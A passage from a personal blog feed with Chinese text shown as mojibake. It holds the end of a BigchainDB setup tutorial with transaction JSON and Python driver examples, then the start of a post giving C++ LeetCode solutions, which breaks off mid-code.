class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;fulfillment&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pGSAIDE5i63cn4X8T8N1sZ2mGkJD5lNRnBM4PZgI_zvzbr-cgUCy4BR6gKaYT-tdyAGPPpknIqI4JYQQ-p2nCg3_9BfOI-15vzldhyz-j_LZVpqAlRmbTzKS-Q5gs7ZIFaZCA_UD&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;fulfills&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;owners_before&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;4K9sWUMFwTgaDGPfdynrbxWqWS6sWmKbZoTjxLtVUibD&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;metadata&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;sequence&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;operation&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CREATE&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;outputs&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;amount&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;condition&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;details&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;public_key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4K9sWUMFwTgaDGPfdynrbxWqWS6sWmKbZoTjxLtVUibD&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ed25519-sha-256&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ni:///sha-256;PNYwdxaRaNw60N6LDFzOWO97b8tJeragczakL8PrAPc?fpt=ed25519-sha-256&amp;cost=131072&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;public_keys&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;4K9sWUMFwTgaDGPfdynrbxWqWS6sWmKbZoTjxLtVUibD&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>æŸ¥è¯¢äº¤æ˜“</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost::9984/api/v1/assets/?search=Hello BigchainDB</span><br></pre></td></tr></table></figure></li></ul><h2 id="step4-bigchaindb-driver"><a href="#step4-bigchaindb-driver" class="headerlink" title="step4. bigchaindb_driver"></a>step4. bigchaindb_driver</h2><ul><li>pythonçš„api</li></ul><h3 id="å®‰è£…ä¾èµ–"><a href="#å®‰è£…ä¾èµ–" class="headerlink" title="å®‰è£…ä¾èµ–"></a>å®‰è£…ä¾èµ–</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip3 install --upgrade setuptools</span><br><span class="line">sudo apt-get install python3-dev libssl-dev libffi-dev</span><br><span class="line">pip3 install python-rapidjson PyNaCl</span><br></pre></td></tr></table></figure><h3 id="å®‰è£…driver"><a href="#å®‰è£…driver" class="headerlink" title="å®‰è£…driver"></a>å®‰è£…driver</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install bigchaindb_driver</span><br></pre></td></tr></table></figure><h3 id="è¿è¡Œæµ‹è¯•ä»£ç "><a href="#è¿è¡Œæµ‹è¯•ä»£ç " class="headerlink" title="è¿è¡Œæµ‹è¯•ä»£ç "></a>è¿è¡Œæµ‹è¯•ä»£ç </h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import BigchainDB and create an object</span></span><br><span class="line"><span class="keyword">from</span> bigchaindb_driver <span class="keyword">import</span> BigchainDB</span><br><span class="line">bdb_root_url = <span class="string">&#x27;https://example.com:9984&#x27;</span></span><br><span class="line">bdb = BigchainDB(bdb_root_url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate a keypair</span></span><br><span class="line"><span class="keyword">from</span> bigchaindb_driver.crypto <span class="keyword">import</span> generate_keypair</span><br><span class="line">alice, bob = generate_keypair(), generate_keypair()</span><br><span class="line"></span><br><span class="line"><span class="comment"># create a digital asset for Alice</span></span><br><span class="line">game_boy_token = &#123;</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;token_for&#x27;</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;game_boy&#x27;</span>: &#123;</span><br><span class="line">                <span class="string">&#x27;serial_number&#x27;</span>: <span class="string">&#x27;LR35902&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;description&#x27;</span>: <span class="string">&#x27;Time share token. Each token equals one hour of usage.&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># prepare the transaction with the digital asset and issue 10 tokens for Bob</span></span><br><span class="line">prepared_token_tx = bdb.transactions.prepare(</span><br><span class="line">    operation=<span class="string">&#x27;CREATE&#x27;</span>,</span><br><span class="line">    signers=alice.public_key,</span><br><span class="line">    recipients=[([bob.public_key], <span class="number">10</span>)],</span><br><span class="line">    asset=game_boy_token)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fulfill and send the transaction</span></span><br><span class="line">fulfilled_token_tx = bdb.transactions.fulfill(</span><br><span class="line">    prepared_token_tx,</span><br><span class="line">    private_keys=alice.private_key)</span><br><span class="line">bdb.transactions.send_commit(fulfilled_token_tx)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use the tokens</span></span><br><span class="line"><span class="comment"># create the output and inout for the transaction</span></span><br><span class="line">transfer_asset = &#123;<span class="string">&#x27;id&#x27;</span>: fulfilled_token_tx[<span class="string">&#x27;id&#x27;</span>]&#125;</span><br><span class="line">output_index = <span class="number">0</span></span><br><span class="line">output = fulfilled_token_tx[<span class="string">&#x27;outputs&#x27;</span>][output_index]</span><br><span class="line">transfer_input = &#123;<span class="string">&#x27;fulfillment&#x27;</span>: output[<span class="string">&#x27;condition&#x27;</span>][<span class="string">&#x27;details&#x27;</span>],</span><br><span class="line">                  <span class="string">&#x27;fulfills&#x27;</span>: &#123;<span class="string">&#x27;output_index&#x27;</span>: output_index,</span><br><span class="line">                               <span class="string">&#x27;transaction_id&#x27;</span>: transfer_asset[<span class="string">&#x27;id&#x27;</span>]&#125;,</span><br><span class="line">                  <span class="string">&#x27;owners_before&#x27;</span>: output[<span class="string">&#x27;public_keys&#x27;</span>]&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># prepare the transaction and use 3 tokens</span></span><br><span class="line">prepared_transfer_tx = bdb.transactions.prepare(</span><br><span class="line">    operation=<span class="string">&#x27;TRANSFER&#x27;</span>,</span><br><span class="line">    asset=transfer_asset,</span><br><span class="line">    inputs=transfer_input,</span><br><span class="line">    recipients=[([alice.public_key], <span class="number">3</span>), ([bob.public_key], <span class="number">7</span>)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># fulfill and send the transaction</span></span><br><span class="line">fulfilled_transfer_tx = bdb.transactions.fulfill(</span><br><span class="line">    prepared_transfer_tx,</span><br><span class="line">    private_keys=bob.private_key)</span><br><span class="line">sent_transfer_tx = bdb.transactions.send_commit(fulfilled_transfer_tx)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;step1-æ„å»ºä¸€ä¸ªBigChainDBèŠ‚ç‚¹&quot;&gt;&lt;a href=&quot;#step1-æ„å»ºä¸€ä¸ªBigChainDBèŠ‚ç‚¹&quot; class=&quot;headerlink&quot; title=&quot;step1. æ„å»ºä¸€ä¸ªBigChainDBèŠ‚ç‚¹&quot;&gt;&lt;/a&gt;step1. æ„å»ºä¸€ä¸ªBigChainDBèŠ‚ç‚¹&lt;/h2&gt;&lt;h3 id=&quot;ä½¿ç”¨All-in-One-Dockeræ­å»º&quot;&gt;&lt;a href=&quot;#ä½¿ç”¨All-in-One-Dockeræ­å»º&quot; class=&quot;headerlink&quot; title=&quot;ä½¿ç”¨All-in-One Dockeræ­å»º&quot;&gt;&lt;/a&gt;ä½¿ç”¨All-in-One Dockeræ­å»º&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;æ‹‰å–é•œåƒ&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;docker pull bigchaindb/bigchaindb:all-in-one&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;è¿è¡Œ&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;docker run \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --detach \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --name bigchaindb \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --publish 9984:9984 \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --publish 9985:9985 \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --publish 27017:27017 \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --publish 26657:26657 \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --volume &lt;span class=&quot;variable&quot;&gt;$HOME&lt;/span&gt;/bigchaindb_docker/mongodb/data/db:/data/db \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --volume &lt;span class=&quot;variable&quot;&gt;$HOME&lt;/span&gt;/bigchaindb_docker/mongodb/data/configdb:/data/configdb \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --volume &lt;span class=&quot;variable&quot;&gt;$HOME&lt;/span&gt;/bigchaindb_docker/tendermint:/tendermint \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  bigchaindb/bigchaindb:all-in-one&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;ä½¿ç”¨Ansibleä¸€é”®è„šæœ¬æ­å»º&quot;&gt;&lt;a href=&quot;#ä½¿ç”¨Ansibleä¸€é”®è„šæœ¬æ­å»º&quot; class=&quot;headerlink&quot; title=&quot;ä½¿ç”¨Ansibleä¸€é”®è„šæœ¬æ­å»º&quot;&gt;&lt;/a&gt;ä½¿ç”¨Ansibleä¸€é”®è„šæœ¬æ­å»º&lt;/h3&gt;</summary>
    
    
    
    <category term="ç»„ä¼š" scheme="https://jingtianer.github.io/home/categories/%E7%BB%84%E4%BC%9A/"/>
    
    
    <category term="ç»„ä¼š" scheme="https://jingtianer.github.io/home/tags/%E7%BB%84%E4%BC%9A/"/>
    
    <category term="BigChain DB" scheme="https://jingtianer.github.io/home/tags/BigChain-DB/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode-20</title>
    <link href="https://jingtianer.github.io/home/2022/11/28/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9320/"/>
    <id>https://jingtianer.github.io/home/2022/11/28/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9320/</id>
    <published>2022-11-28T03:14:34.000Z</published>
    <updated>2022-11-30T01:07:08.968Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1758-ç”Ÿæˆäº¤æ›¿äºŒè¿›åˆ¶å­—ç¬¦ä¸²çš„æœ€å°‘æ“ä½œæ•°"><a href="#1758-ç”Ÿæˆäº¤æ›¿äºŒè¿›åˆ¶å­—ç¬¦ä¸²çš„æœ€å°‘æ“ä½œæ•°" class="headerlink" title="1758. ç”Ÿæˆäº¤æ›¿äºŒè¿›åˆ¶å­—ç¬¦ä¸²çš„æœ€å°‘æ“ä½œæ•°"></a><a href="https://leetcode.cn/problems/minimum-changes-to-make-alternating-binary-string/">1758. ç”Ÿæˆäº¤æ›¿äºŒè¿›åˆ¶å­—ç¬¦ä¸²çš„æœ€å°‘æ“ä½œæ•°</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minOperations</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">min</span>(<span class="built_in">cal</span>(s, len, <span class="literal">true</span>), <span class="built_in">cal</span>(s, len, <span class="literal">false</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">cal</span><span class="params">(<span class="type">const</span> string&amp; s, <span class="type">int</span> len, <span class="type">bool</span> flag)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(flag &amp;&amp; s[i] == <span class="string">&#x27;0&#x27;</span> || !flag &amp;&amp; s[i] == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">            flag = !flag;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="813-æœ€å¤§å¹³å‡å€¼å’Œçš„åˆ†ç»„"><a href="#813-æœ€å¤§å¹³å‡å€¼å’Œçš„åˆ†ç»„" class="headerlink" title="813. æœ€å¤§å¹³å‡å€¼å’Œçš„åˆ†ç»„"></a><a href="https://leetcode.cn/problems/largest-sum-of-averages/">813. æœ€å¤§å¹³å‡å€¼å’Œçš„åˆ†ç»„</a></h2><h3 id="è¶…æ—¶æš´æœ"><a href="#è¶…æ—¶æš´æœ" class="headerlink" title="è¶…æ—¶æš´æœ"></a>è¶…æ—¶æš´æœ</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; sum;</span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">largestSumOfAverages</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        len = nums.<span class="built_in">size</span>();</span><br><span class="line">        sum = <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(len+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= len; i++) &#123;</span><br><span class="line">            sum[i] = nums[i<span class="number">-1</span>] + sum[i<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">search</span>(nums, k, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">search</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k, <span class="type">int</span> i, <span class="type">int</span> K, <span class="type">double</span> left_value, <span class="type">int</span> last_j)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(k == K || i == len) &#123;</span><br><span class="line">            <span class="keyword">return</span> left_value + (sum[len] - sum[last_j] + <span class="number">0.0</span>) / (len - last_j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(<span class="built_in">search</span>(nums, k, i+<span class="number">1</span>, K+<span class="number">1</span>, left_value + (sum[i] - sum[last_j] + <span class="number">0.0</span>)/(i-last_j), i), <span class="built_in">search</span>(nums, k,i+<span class="number">1</span>, K, left_value, last_j));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">max</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>æ˜¨å¤©ç¬¬ä¸€ä¸ªæ€è·¯æ˜¯ç”¨æ’åºï¼Œæ‰¾å‡ºæœ€å¤§çš„mä¸ªæ•°ï¼Œè¿™mä¸ªæ•°æ°å¥½å°†æ•°ç»„åˆ†æˆkä¸ªéƒ¨åˆ†ï¼Œå‘ç°ä¸å¯è¡Œã€‚<br>ç„¶åæš´åŠ›æœç´¢ï¼Œè¶…æ—¶äº†ï¼Œæš´æœæ—¶è€ƒè™‘æ·»åŠ éš”æ¿ï¼Œå…¶ä¸­left_valueè¡¨ç¤ºå½“å‰æœç´¢ä¸‹æ ‡iä¹‹å‰çš„åˆ†ç»„å¹³å‡å€¼</p></blockquote><h3 id="ç±»ä¼¼èƒŒåŒ…"><a href="#ç±»ä¼¼èƒŒåŒ…" class="headerlink" title="ç±»ä¼¼èƒŒåŒ…"></a>ç±»ä¼¼èƒŒåŒ…</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">largestSumOfAverages</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">sum</span><span class="params">(len+<span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">double</span>&gt;&gt; <span class="built_in">left_avg</span>(k<span class="number">-1</span>, <span class="built_in">vector</span>&lt;<span class="type">double</span>&gt;(len, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= len; i++) &#123;</span><br><span class="line">            sum[i] = nums[i<span class="number">-1</span>] + sum[i<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">double</span> maxx = sum[len] / (len + <span class="number">0.0</span>);</span><br><span class="line">        <span class="keyword">if</span>(k &lt;= <span class="number">1</span>) <span class="keyword">return</span> maxx;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; len; i++) &#123;</span><br><span class="line">            left_avg[<span class="number">0</span>][i] = <span class="built_in">double</span>(sum[i])/i;</span><br><span class="line">            maxx = <span class="built_in">max</span>(maxx, left_avg[<span class="number">0</span>][i] + <span class="built_in">double</span>(sum[len] - sum[i])/(len-i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; k<span class="number">-2</span>; i++) &#123; <span class="comment">//ç¬¬å‡ ä¸ªéš”æ¿</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = i+<span class="number">1</span>; j &lt; len; j++) &#123; <span class="comment">// å‰ä¸€ä¸ªéš”æ¿çš„ä½ç½®</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> p = j+<span class="number">1</span>; p &lt; len; p++) &#123; <span class="comment">// ç°åœ¨éš”æ¿çš„ä½ç½®</span></span><br><span class="line">                    maxx = <span class="built_in">max</span>(left_avg[i][j] + <span class="built_in">double</span>(sum[p] - sum[j])/(p-j) + <span class="built_in">double</span>(sum[len] - sum[p])/(len-p), maxx);</span><br><span class="line">                    <span class="comment">// left_avg + å½“å‰éš”æ¿ä¸ä¸Šä¸€ä¸ªéš”æ¿çš„avgï¼Œ æœ€åä¸€ä¸ªæ•°åˆ°å½“å‰éš”æ¿çš„avg</span></span><br><span class="line">                    left_avg[i+<span class="number">1</span>][p] = <span class="built_in">max</span>(left_avg[i][j] + <span class="built_in">double</span>(sum[p] - sum[j])/(p-j), left_avg[i+<span class="number">1</span>][p]);</span><br><span class="line">                    <span class="comment">// æ›´æ–°avg</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxx;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>ä»Šå¤©è€ƒè™‘ç”¨ç±»ä¼¼èƒŒåŒ…çš„æƒ³æ³•ï¼Œç»“åˆæš´åŠ›æœç´¢çš„left_avgï¼Œç”¨$ left_avg[i][j] $ ï¼Œè¡¨ç¤ºæ·»åŠ iä¸ªéš”æ¿ï¼Œåœ¨jä¹‹å‰çš„æœ€å¤§left_avg<br>ä»ç¬¬äºŒä¸ªéš”æ¿å¼€å§‹ï¼Œå‡è®¾ç¬¬iä¸ªéš”æ¿åˆ†åˆ«åœ¨ä½ç½® $j &#x3D; i+1,i+2,i+3 â€¦$ æ—¶ï¼Œç¬¬ $i+1$ä¸ªéš”æ¿å¯ä»¥åœ¨ $p &#x3D; j+1, j+2, â€¦$<br>è®¡ç®—å‰åä¸¤ä¸ªéš”æ¿å„ç§æƒ…å†µçš„æœ€å¤§å€¼ï¼Œæ›´æ–°left_avgï¼Œæ›´æ–°maxx</p></blockquote><h3 id="ä¼˜åŒ–"><a href="#ä¼˜åŒ–" class="headerlink" title="ä¼˜åŒ–"></a>ä¼˜åŒ–</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">largestSumOfAverages</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">sum</span><span class="params">(len+<span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= len; i++) &#123;</span><br><span class="line">            sum[i] = nums[i<span class="number">-1</span>] + sum[i<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(k &lt;= <span class="number">1</span>) <span class="keyword">return</span> sum[len] / (len + <span class="number">0.0</span>);</span><br><span class="line">        vector&lt;vector&lt;<span class="type">double</span>&gt;&gt; <span class="built_in">left_avg</span>(k<span class="number">-1</span>, <span class="built_in">vector</span>&lt;<span class="type">double</span>&gt;(len, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; len; i++) &#123;</span><br><span class="line">            left_avg[<span class="number">0</span>][i] = <span class="built_in">double</span>(sum[i])/i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span 